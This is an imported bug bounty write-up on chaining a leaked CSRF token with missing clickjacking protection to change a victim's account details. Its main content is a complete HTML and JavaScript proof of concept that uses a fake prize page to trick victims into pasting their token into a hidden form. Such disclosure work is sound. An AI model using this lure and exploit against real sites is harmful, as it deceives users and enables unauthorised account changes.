---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-07-16_bypass-csrf-with-clickjacking-worth-1250.md
original_filename: 2019-07-16_bypass-csrf-with-clickjacking-worth-1250.md
title: Bypass CSRF With ClickJacking Worth $1250
category: documents
detected_topics:
- command-injection
- otp
- csrf
- clickjacking
tags:
- imported
- documents
- command-injection
- otp
- csrf
- clickjacking
language: en
raw_sha256: b53f50ba0dd28b8fed7be28db43d61fce0906ec92f12aa01892bd5c9e9c8e91e
text_sha256: 8dfd336f19be1f28d62d9cc17cb46f215128f924b46fa2f1147e109bcaf809a5
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Bypass CSRF With ClickJacking Worth $1250

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-07-16_bypass-csrf-with-clickjacking-worth-1250.md
- Source Type: markdown
- Detected Topics: command-injection, otp, csrf, clickjacking
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `b53f50ba0dd28b8fed7be28db43d61fce0906ec92f12aa01892bd5c9e9c8e91e`
- Text SHA256: `8dfd336f19be1f28d62d9cc17cb46f215128f924b46fa2f1147e109bcaf809a5`


## Content

---
title: "Bypass CSRF With ClickJacking Worth $1250"
url: "https://medium.com/@saadahmedx/bypass-csrf-with-clickjacking-worth-1250-6c70cc263f40"
authors: ["Saad Ahmed (@XSaadAhmedX)"]
bugs: ["CSRF", "Clickjacking"]
bounty: "1,250"
publication_date: "2019-07-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5144
scraped_via: "browseros"
---

# Bypass CSRF With ClickJacking Worth $1250

Bypass CSRF With ClickJacking Worth $1250
Saad Ahmed
Follow
2 min read
·
Jul 16, 2019

291

Hello friends, I hope you all are doing well, so this write up is all about how I chained the two different vulnerabilities to update the victim account details. Let’s assume the website name is redacted.com

So when I visited the profile page https://redacted.com/editinfo/& tried to change the account details there was a CSRF token I tried different methods to bypass that CSRF protection but failed, then I found the suspicious endpoint that was disclosing the CSRF token https://redacted.com/accountinfo/personal/lpsust/v1/redacted.com/

Get Saad Ahmed’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So when I opened that endpoint I found the CSRF token in the response, Now the next part was to steal the CSRF token & then I found out that there was no protection from the click jacking I created an HTML + JS Script to exploit the CSRF in just 1 Click

<!DOCTYPE html>
<html>
<head>
<title></title>
</head>
<body>

<center><h1 style=”color: blue; text-decoration: underline;”>Lucky Draw to Win a $100</h1></center>

<h3>Click inside the box and Press CTRL+A then CTRL+C</h3>

<div style=”border: 2px solid gray;”>
<iframe src=”https://redacted.com/accountinfo/personal/lpsust/v1/redacted.com/" width=”100%” style=”opacity: 0"></iframe>

</div>

<h3>Click inside the box and press CTRL+V</h3>
<input type=”password” name=”” size=”1">

<br>
<button id=”btn”>Click to Win</button>

<div style=”display: none;”>
<form action=”” method=”POST”>
<input type=”hidden” name=”addrid” value=”12741305" />
<input type=”hidden” name=”uname” value=”hack@gmail.com” />
<input type=”hidden” name=”issendmsg” value=”1" />
<input type=”hidden” name=”display” value=”” />
<input type=”hidden” name=”sendtype” value=”update” />
<input type=”hidden” name=”firstname” value=”accountinfo” />
<input type=”hidden” name=”lastname” value=”HACKED” />
<input type=”hidden” name=”country” value=”US” />
<input type=”hidden” name=”reglang” value=”en&#95;US” />
<input type=”hidden” name=”postcode” value=”1337" />
<input type=”submit” value=”Submit request” />
</form>
</div>

</body>

<script>
document.querySelector(“#btn”).onclick = function() {
var token = document.querySelector(“input”).value
var form = document.querySelector(“form”)

token = JSON.parse(token)
var mapInput = document.createElement(“input”);
mapInput.type = “hidden”;
mapInput.name = “auth_token”;
mapInput.value = token.Value;

form.appendChild(mapInput)

form.action = `https://redacted.com/editInfo`
form.submit();
alert(“Congratulation! You have won $100”)
}
</script>

</html>

Press enter or click to view image in full size

So when the victim pastes the api response in the field & clicks on CLICK TO WIN. The js code will append the input field in form with the CSRF token that i got from victim & made request to update the account details & Boom it worked. I hope you like it

./LOGOUT
